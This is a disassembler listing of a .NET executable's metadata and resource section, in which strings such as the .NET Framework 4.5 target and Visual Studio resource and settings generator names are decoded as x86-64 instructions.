   1400036a5:	31 30                	xor    %esi,(%rax)
   1400036a7:	37                   	(bad)
   1400036a8:	32 2e                	xor    (%rsi),%ch
   1400036aa:	35 35 00 00 49       	xor    $0x49000035,%eax
   1400036af:	01 00                	add    %eax,(%rax)
   1400036b1:	1a 2e                	sbb    (%rsi),%ch
   1400036b3:	4e                   	rex.WRX
   1400036b4:	45 54                	rex.RB push %r12
   1400036b6:	46 72 61             	rex.RX jb 0x14000371a
   1400036b9:	6d                   	insl   (%dx),(%rdi)
   1400036ba:	65 77 6f             	gs ja  0x14000372c
   1400036bd:	72 6b                	jb     0x14000372a
   1400036bf:	2c 56                	sub    $0x56,%al
   1400036c1:	65 72 73             	gs jb  0x140003737
   1400036c4:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%rdi),%ebp
   1400036cb:	35 01 00 54 0e       	xor    $0xe540001,%eax
   1400036d0:	14 46                	adc    $0x46,%al
   1400036d2:	72 61                	jb     0x140003735
   1400036d4:	6d                   	insl   (%dx),(%rdi)
   1400036d5:	65 77 6f             	gs ja  0x140003747
   1400036d8:	72 6b                	jb     0x140003745
   1400036da:	44 69 73 70 6c 61 79 	imul   $0x4e79616c,0x70(%rbx),%r14d
   1400036e1:	4e 
   1400036e2:	61                   	(bad)
   1400036e3:	6d                   	insl   (%dx),(%rdi)
   1400036e4:	65 12 2e             	adc    %gs:(%rsi),%ch
   1400036e7:	4e                   	rex.WRX
   1400036e8:	45 54                	rex.RB push %r12
   1400036ea:	20 46 72             	and    %al,0x72(%rsi)
   1400036ed:	61                   	(bad)
   1400036ee:	6d                   	insl   (%dx),(%rdi)
   1400036ef:	65 77 6f             	gs ja  0x140003761
   1400036f2:	72 6b                	jb     0x14000375f
   1400036f4:	20 34 2e             	and    %dh,(%rsi,%rbp,1)
   1400036f7:	35 04 01 00 00       	xor    $0x104,%eax
   1400036fc:	00 41 01             	add    %al,0x1(%rcx)
   1400036ff:	00 33                	add    %dh,(%rbx)
   140003701:	53                   	push   %rbx
   140003702:	79 73                	jns    0x140003777
   140003704:	74 65                	je     0x14000376b
   140003706:	6d                   	insl   (%dx),(%rdi)
   140003707:	2e 52                	cs push %rdx
   140003709:	65 73 6f             	gs jae 0x14000377b
   14000370c:	75 72                	jne    0x140003780
   14000370e:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003711:	2e 54                	cs push %rsp
   140003713:	6f                   	outsl  (%rsi),(%dx)
   140003714:	6f                   	outsl  (%rsi),(%dx)
   140003715:	6c                   	insb   (%dx),(%rdi)
   140003716:	73 2e                	jae    0x140003746
   140003718:	53                   	push   %rbx
   140003719:	74 72                	je     0x14000378d
   14000371b:	6f                   	outsl  (%rsi),(%dx)
   14000371c:	6e                   	outsb  (%rsi),(%dx)
   14000371d:	67 6c                	insb   (%dx),(%edi)
   14000371f:	79 54                	jns    0x140003775
   140003721:	79 70                	jns    0x140003793
   140003723:	65 64 52             	gs fs push %rdx
   140003726:	65 73 6f             	gs jae 0x140003798
   140003729:	75 72                	jne    0x14000379d
   14000372b:	63 65 42             	movsxd 0x42(%rbp),%esp
   14000372e:	75 69                	jne    0x140003799
   140003730:	6c                   	insb   (%dx),(%rdi)
   140003731:	64 65 72 08          	fs gs jb 0x14000373d
   140003735:	31 36                	xor    %esi,(%rsi)
   140003737:	2e 30 2e             	cs xor %ch,(%rsi)
   14000373a:	30 2e                	xor    %ch,(%rsi)
   14000373c:	30 00                	xor    %al,(%rax)
   14000373e:	00 5a 01             	add    %bl,0x1(%rdx)
   140003741:	00 4b 4d             	add    %cl,0x4d(%rbx)
   140003744:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%rbx),%esp
   14000374b:	74 2e                	je     0x14000377b
   14000374d:	56                   	push   %rsi
   14000374e:	69 73 75 61 6c 53 74 	imul   $0x74536c61,0x75(%rbx),%esi
   140003755:	75 64                	jne    0x1400037bb
   140003757:	69 6f 2e 45 64 69 74 	imul   $0x74696445,0x2e(%rdi),%ebp
   14000375e:	6f                   	outsl  (%rsi),(%dx)
   14000375f:	72 73                	jb     0x1400037d4
   140003761:	2e 53                	cs push %rbx
   140003763:	65 74 74             	gs je  0x1400037da
   140003766:	69 6e 67 73 44 65 73 	imul   $0x73654473,0x67(%rsi),%ebp
   14000376d:	69 67 6e 65 72 2e 53 	imul   $0x532e7265,0x6e(%rdi),%esp
   140003774:	65 74 74             	gs je  0x1400037eb
   140003777:	69 6e 67 73 53 69 6e 	imul   $0x6e695373,0x67(%rsi),%ebp
   14000377e:	67 6c                	insb   (%dx),(%edi)
   140003780:	65 46 69 6c 65 47 65 	imul   $0x72656e65,%gs:0x47(%rbp,%r12,2),%r13d
   140003787:	6e 65 72 
   14000378a:	61                   	(bad)
   14000378b:	74 6f                	je     0x1400037fc
   14000378d:	72 09                	jb     0x140003798
   14000378f:	31 36                	xor    %esi,(%rsi)
   140003791:	2e 31 30             	cs xor %esi,(%rax)
   140003794:	2e 30 2e             	cs xor %ch,(%rsi)
   140003797:	30 00                	xor    %al,(%rax)
   140003799:	00 08                	add    %cl,(%rax)
   14000379b:	01 00                	add    %eax,(%rax)
   14000379d:	02 00                	add    (%rax),%al
   14000379f:	00 00                	add    %al,(%rax)
   1400037a1:	00 00                	add    %al,(%rax)
   1400037a3:	00 b4 00 00 00 ce ca 	add    %dh,-0x35320000(%rax,%rax,1)
   1400037aa:	ef                   	out    %eax,(%dx)
   1400037ab:	be 01 00 00 00       	mov    $0x1,%esi
   1400037b0:	91                   	xchg   %eax,%ecx
   1400037b1:	00 00                	add    %al,(%rax)
   1400037b3:	00 6c 53 79          	add    %ch,0x79(%rbx,%rdx,2)
   1400037b7:	73 74                	jae    0x14000382d
   1400037b9:	65 6d                	gs insl (%dx),(%rdi)
   1400037bb:	2e 52                	cs push %rdx
   1400037bd:	65 73 6f             	gs jae 0x14000382f
   1400037c0:	75 72                	jne    0x140003834
   1400037c2:	63 65 73             	movsxd 0x73(%rbp),%esp
   1400037c5:	2e 52                	cs push %rdx
   1400037c7:	65 73 6f             	gs jae 0x140003839
   1400037ca:	75 72                	jne    0x14000383e
   1400037cc:	63 65 52             	movsxd 0x52(%rbp),%esp
   1400037cf:	65 61                	gs (bad)
   1400037d1:	64 65 72 2c          	fs gs jb 0x140003801
   1400037d5:	20 6d 73             	and    %ch,0x73(%rbp)
   1400037d8:	63 6f 72             	movsxd 0x72(%rdi),%ebp
   1400037db:	6c                   	insb   (%dx),(%rdi)
   1400037dc:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%rdx),%esp
   1400037e3:	73 69                	jae    0x14000384e
   1400037e5:	6f                   	outsl  (%rsi),(%dx)
   1400037e6:	6e                   	outsb  (%rsi),(%dx)
   1400037e7:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
   1400037ec:	30 2e                	xor    %ch,(%rsi)
   1400037ee:	30 2c 20             	xor    %ch,(%rax,%riz,1)
   1400037f1:	43 75 6c             	rex.XB jne 0x140003860
   1400037f4:	74 75                	je     0x14000386b
   1400037f6:	72 65                	jb     0x14000385d
   1400037f8:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
   1400037fd:	72 61                	jb     0x140003860
   1400037ff:	6c                   	insb   (%dx),(%rdi)
   140003800:	2c 20                	sub    $0x20,%al
   140003802:	50                   	push   %rax
   140003803:	75 62                	jne    0x140003867
   140003805:	6c                   	insb   (%dx),(%rdi)
   140003806:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%rbx),%esp
   14000380d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%rbp),%esp
   140003811:	62 37 37 61 35       	(bad)
   140003816:	63 35 36 31 39 33    	movsxd 0x33393136(%rip),%esi        # 0x173396952
   14000381c:	34 65                	xor    $0x65,%al
   14000381e:	30 38                	xor    %bh,(%rax)
   140003820:	39 23                	cmp    %esp,(%rbx)
   140003822:	53                   	push   %rbx
   140003823:	79 73                	jns    0x140003898
   140003825:	74 65                	je     0x14000388c
   140003827:	6d                   	insl   (%dx),(%rdi)
   140003828:	2e 52                	cs push %rdx
   14000382a:	65 73 6f             	gs jae 0x14000389c
   14000382d:	75 72                	jne    0x1400038a1
   14000382f:	63 65 73             	movsxd 0x73(%rbp),%esp
   140003832:	2e 52                	cs push %rdx
   140003834:	75 6e                	jne    0x1400038a4
   140003836:	74 69                	je     0x1400038a1
   140003838:	6d                   	insl   (%dx),(%rdi)
   140003839:	65 52                	gs push %rdx
   14000383b:	65 73 6f             	gs jae 0x1400038ad
   14000383e:	75 72                	jne    0x1400038b2
   140003840:	63 65 53             	movsxd 0x53(%rbp),%esp
   140003843:	65 74 02             	gs je  0x140003848
	...
   14000384e:	00 00                	add    %al,(%rax)
   140003850:	00 50 41             	add    %dl,0x41(%rax)
   140003853:	44 50                	rex.R push %rax
   140003855:	41                   	rex.B
   140003856:	44 50                	rex.R push %rax
   140003858:	b4 00                	mov    $0x0,%ah
	...
   140003866:	00 00                	add    %al,(%rax)
   140003868:	10 00                	adc    %al,(%rax)
	...
